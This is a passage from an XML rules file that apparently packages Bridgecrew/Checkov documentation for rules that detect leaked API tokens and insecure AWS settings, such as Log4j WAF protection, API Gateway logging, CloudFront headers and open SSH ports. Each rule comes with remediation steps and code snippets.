<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">DELETE /api/auth/keys/3 HTTP/1.1
Accept: application/json
Content-Type: application/json
Authorization: Bearer eyJrIjoiT0tTcG1pUlY2RnVKZTFVaDFsNFZXdE9ZWmNrMkZYbk
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_46' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_46</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_46' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_47</key>
    <name>Terraform Cloud API Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform-cloud-api-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform-cloud-api-token"></div>Terraform Cloud API Token</div><a aria-label="Skip link to Terraform Cloud API Token" class="heading-anchor-icon fa fa-anchor" href="#terraform-cloud-api-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Terraform Cloud supports three distinct types of API tokens with varying levels of access: user, team, and organization.  API tokens are displayed only once when they are created, and are obfuscated thereafter. If the token is lost, it must be regenerated.</p>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="user-api-tokens"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-user-api-tokens"></div>User API Tokens</div><a aria-label="Skip link to User API Tokens" class="heading-anchor-icon fa fa-anchor" href="#user-api-tokens"></a></h3>
<p>User tokens are the most flexible token type because they inherit permissions from the user they are associated with.</p>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="team-api-tokens"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-team-api-tokens"></div>Team API Tokens</div><a aria-label="Skip link to Team API Tokens" class="heading-anchor-icon fa fa-anchor" href="#team-api-tokens"></a></h3>
<p>Team API tokens allow access to the workspaces that the team has access to, without being tied to any specific user. Each team can have one valid API token at a time, and any member of a team can generate or revoke that team's token. When a token is regenerated, the previous token immediately becomes invalid.</p>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="organization-api-tokens"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-organization-api-tokens"></div>Organization API Tokens</div><a aria-label="Skip link to Organization API Tokens" class="heading-anchor-icon fa fa-anchor" href="#organization-api-tokens"></a></h3>
<p>Organization API tokens allow access to the organization-level settings and resources, without being tied to any specific team or user. To manage the API token for an organization, go to Organization settings &gt; API Token and use the controls under the "Organization Tokens" header. Each organization can have one valid API token at a time. Only organization owners can generate or revoke an organization's token.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">DELETE /authentication-tokens/:id</code></p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">curl \
  --header "Authorization: Bearer $TOKEN" \
  --header "Content-Type: application/vnd.api+json" \
  --request DELETE \
  https://app.terraform.io/api/v2/authentication-tokens/at-6yEmxNAhaoQLH1Da
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_47' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_47</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_47' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_48</key>
    <name>Heroku Platform Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="heroku-platform-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-heroku-platform-key"></div>Heroku Platform Key</div><a aria-label="Skip link to Heroku Platform Key" class="heading-anchor-icon fa fa-anchor" href="#heroku-platform-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Heroku is a cloud platform as a service (PaaS) supporting several programming languages. The Heroku network runs the customer's apps in virtual containers which execute on a reliable runtime environment. Heroku calls these containers "Dynos". These Dynos can run code written in Node, Ruby, PHP, Go, Scala, Python, Java, or Clojure. Heroku also provides custom buildpacks with which the developer can deploy apps in any other language. Heroku lets the developer scale the app instantly just by either increasing the number of dynos or by changing the type of dyno the app runs in.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_48' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_48</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_48' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_49</key>
    <name>HubSpot API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="hubspot-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-hub-spot-api-key"></div>HubSpot API Key</div><a aria-label="Skip link to HubSpot API Key" class="heading-anchor-icon fa fa-anchor" href="#hubspot-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>With the HubSpot API key, developers can create custom applications with HubSpot&#8217;s APIs. Each key is specific to a HubSpot account, not an individual user, and only one key is allowed at a time.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>To rotate your HubSpot API key:</p>
<ul>
<li>In your HubSpot account, click the settings icon in the main navigation bar.<br/>
In the left sidebar menu, navigate to Integrations &gt; API key.</li>
<li>Click the Actions dropdown menu, then select Rotate key.</li>
<li>Click Rotate and expire this key now. Select the reCAPTCHA checkbox. Your existing key will be deactivated and a new API key will be created.</li>
<li>Click Copy and replace the deactivated API key used by your applications with this new API key.</li>
</ul> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_49' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_49</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_49' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_50</key>
    <name>Intercom Access Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="intercom-access-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-intercom-access-token"></div>Intercom Access Token</div><a aria-label="Skip link to Intercom Access Token" class="heading-anchor-icon fa fa-anchor" href="#intercom-access-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Intercom Access Token allows access to the Intercom API. The Access Token is recommended for use in the following scenarios:</p>
<ul>
<li>When using the API to interact with an Intercom app</li>
<li>When creating scripts that push or extract data from the Intercom app</li>
<li>When automating certain actions in your the Intercom app</li>
<li>When programmatically accessing customer data</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>You can regenerate the Access Token by clicking Regenerate token or uninstall this app which will revoke the Access Token (by clicking Uninstall app).</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_50' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_50</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_50' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_51</key>
    <name>Jira Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="jira-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-jira-token"></div>Jira Token</div><a aria-label="Skip link to Jira Token" class="heading-anchor-icon fa fa-anchor" href="#jira-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In Jira, Personal access tokens (PATs) are a secure way to use scripts and integrate external applications with your Atlassian application. If an external system is compromised, you simply revoke the token instead of changing the password and consequently changing it in all scripts and integrations. Personal access tokens are a safe alternative to using username and password for authentication with various services. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>In your Atlassian application go to:</li>
<li>In Jira select your profile picture at the top right of the screen, then choose  Personal Access Tokens .</li>
<li>Select Revoke next to the token you want to delete.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_51' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_51</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_51' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_192</key>
    <name>Ensure WAF prevents message lookup in Log4j2</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="waf-allows-message-lookup-in-log4j2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-waf-allows-message-lookup-in-log-4-j-2"></div>WAF allows message lookup in Log4j2</div><a aria-label="Skip link to WAF allows message lookup in Log4j2" class="heading-anchor-icon fa fa-anchor" href="#waf-allows-message-lookup-in-log4j2"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Using a vulnerable version of Apache Log4j library might enable attackers to exploit a Lookup mechanism that supports making requests using special syntax in a format string which can potentially lead to a risky code execution, data leakage and more.<br/>
Set your Web Application Firewall (WAF) to prevent executing such mechanism using the rule definition below.</p>
<p>Learn more around <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_self">CVE-2021-44228</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_wafv2_web_acl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_wafv2_web_acl" "pass" {
  ...

  rule {
    name     = "AWS-AWSManagedRulesKnownBadInputsRuleSet"
    priority = 1

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesKnownBadInputsRuleSet"
        vendor_name = "AWS"
      }
    }

    ...
  }

  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::WAFv2::WebACL</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">Pass:
    Type: AWS::WAFv2::WebACL
    Properties:
      ...

      Rules:
        - Name: AWS-AWSManagedRulesKnownBadInputsRuleSet
          Priority: 1
          Statement:
            ManagedRuleGroupStatement:
              VendorName: AWS
              Name: AWSManagedRulesKnownBadInputsRuleSet
          OverrideAction:
            None: {}
          ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-waf-prevents-message-lookup-in-log4j2' target='_blank'> https://docs.bridgecrew.io/docs/ensure-waf-prevents-message-lookup-in-log4j2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-waf-prevents-message-lookup-in-log4j2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_95</key>
    <name>Ensure API Gateway V2 has Access Logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-api-gateway-v2-has-access-logging-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-api-gateway-v-2-has-access-logging-is-disabled"></div>AWS API Gateway V2 has Access Logging is disabled</div><a aria-label="Skip link to AWS API Gateway V2 has Access Logging is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-api-gateway-v2-has-access-logging-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling the custom access logging option in API Gateway allows delivery of custom logs to CloudWatch Logs, which can be analyzed using CloudWatch Logs Insights. Using custom domain names in Amazon API Gateway allows insights into requests sent to each custom domain name. If there is more than one custom domain name mapped to a single API, understanding the quantity and type of requests by domain name may help understand request patterns.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>Procedure:</p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/apigateway/" target="_self">Amazon API Gateway console</a>.</li>
<li>Find the Stage Editor for your API.</li>
<li>On the <strong>Stage Editor</strong> pane, choose the <strong>Logs/Tracing</strong> tab.</li>
<li>On the Logs/Tracing tab, under CloudWatch Settings, do the following to enable execution logging.</li>
<li>Select the <strong>Enable CloudWatch Logs</strong> check box.</li>
<li>For Log level, choose <strong>INFO </strong>to generate execution logs for all requests. Or, choose <strong>ERROR </strong>to generate execution logs only for requests to your API that result in an error.</li>
<li>Select the Log full requests/responses data check box for a REST API. Or, select the Log full message data check box for a WebSocket API.</li>
<li>Under <strong>Custom Access Logging</strong>, select the Enable Access Logging check box.</li>
<li>For <strong>Access Log Destination ARN</strong>, enter the ARN of a CloudWatch log group or an Amazon Kinesis Data Firehose stream.</li>
<li>Enter a Log Format. For guidance, you can choose CLF, JSON, XML, or CSV to see an example in that format.</li>
<li>Click <strong>Save Changes</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS:: AWS::ApiGatewayV2::Stage</li>
<li><strong>Argument:</strong> AccessLogSettings</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">MyStage:
  Type: 'AWS::ApiGatewayV2::Stage'
  Properties:
    StageName: Prod
    Description: Prod Stage
    DeploymentId: !Ref MyDeployment
    ApiId: !Ref CFNWebSocket
    DefaultRouteSettings:
      DetailedMetricsEnabled: true
      LoggingLevel: INFO
      DataTraceEnabled: false
      ThrottlingBurstLimit: 10
      ThrottlingRateLimit: 10
  +  AccessLogSettings:
      DestinationArn: 'arn:aws:logs:us-east-1:123456789:log-group:my-log-group'
      Format: &gt;-
        {"requestId":"$context.requestId", "ip": "$context.identity.sourceIp",
        "caller":"$context.identity.caller",
        "user":"$context.identity.user","requestTime":"$context.requestTime",
        "eventType":"$context.eventType","routeKey":"$context.routeKey",
        "status":"$context.status","connectionId":"$context.connectionId"}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_30' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_30</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_30' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_32</key>
    <name>Ensure CloudFront distribution has a strict security headers policy attached</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudfront-distribution-does-not-have-a-strict-security-headers-policy-attached"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-front-distribution-does-not-have-a-strict-security-headers-policy-attached"></div>AWS CloudFront distribution does not have a strict security headers policy attached</div><a aria-label="Skip link to AWS CloudFront distribution does not have a strict security headers policy attached" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudfront-distribution-does-not-have-a-strict-security-headers-policy-attached"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon CloudFront is a content delivery network (CDN) that delivers static and dynamic web content using a global network of edge locations. CloudFront introduced response headers policies to address this need and give the customers more control in defining header modifications performed by CloudFront. While it has been possible to manipulate response headers with CloudFront&#8217;s edge serverless options, typically it doesn&#8217;t require a custom logic unique to the use case. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_cloudfront_distribution  </li>
<li>*<em>Argument:</em> response_headers_policy_id (Optional) - The identifier for a response headers policy.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudfront_distribution" "s3_distribution" {
  origin {
    domain_name = aws_s3_bucket.b.bucket_regional_domain_name
    origin_id   = local.s3_origin_id

    s3_origin_config {
      origin_access_identity = "origin-access-identity/cloudfront/ABCDEFG1234567"
    }
  }

+  default_cache_behavior {
+    response_headers_policy_id = aws_cloudfront_response_headers_policy.pass.id
+  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_networking_65' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_networking_65</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_networking_65' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_24</key>
    <name>Ensure AWS Security Group does not allow all traffic on SSH port 22</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-security-group-allows-all-traffic-on-ssh-port-22"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-security-group-allows-all-traffic-on-ssh-port-22"></div>AWS Security Group allows all traffic on SSH port 22</div><a aria-label="Skip link to AWS Security Group allows all traffic on SSH port 22" class="heading-anchor-icon fa fa-anchor" href="#aws-security-group-allows-all-traffic-on-ssh-port-22"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Security groups are stateful and provide filtering of ingress/egress network traffic to AWS resources. We recommend that security groups do not allow unrestricted ingress access to port 22. Removing unfettered connectivity to remote console services, such as SSH, reduces a server's exposure to risk.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To implement the prescribed state, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/vpc/" target="_self">Amazon VPC console</a>.</li>
<li>In the left pane, click <strong>Security Groups</strong>. </li>
<li>For each security group, perform the following:<br/>
a) Select the <em>security group</em>.<br/>
b) Click <strong>Inbound Rules</strong>.<br/>
c) Identify the rules to be removed.<br/>
d) Click <strong>X</strong> in the Remove column.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Review the rules for an existing security group (Replacing the security group ID and region).</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws ec2 describe-security-groups
--group-ids sg-xxxxxxxxxxxxxxxxx
--region us-east-1
</code></pre></div></div>
<ol start="2">
<li>Review and EC2 instances using the security group.</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws ec2 describe-instances
--filters Name=instance.group-id,Values=sg-xxxxxxxxxxxxxxxxx
--region us-east-1
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix-buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix Buildtime</div><a aria-label="Skip link to Fix Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix-buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_security_group</li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_security_group.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_security_group.tf">resource "aws_security_group" "example" {
...
ingress {
    cidr_blocks = [
-     "0.0.0.0/0"
+     "10.0.0.1/32"
    ]
    from_port = 22
    to_port = 22
    protocol = "tcp"
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::EC2::SecurityGroup</li>
<li><strong>Argument:</strong> Properties.SecurityGroupIngress</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::EC2::SecurityGroup
    Properties:
      ...
      SecurityGroupIngress:
      - Description: SSH Ingress
        IpProtocol: tcp
        FromPort: 22
        ToPort: 22
-       CidrIp: "0.0.0.0/0"
+       CidrIp: "10.10.10.0/24"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/networking_1-port-security' target='_blank'> https://docs.bridgecrew.io/docs/networking_1-port-security</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/networking_1-port-security' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_52</key>
    <name>LaunchDarkly Personal Token</name>
    <description>
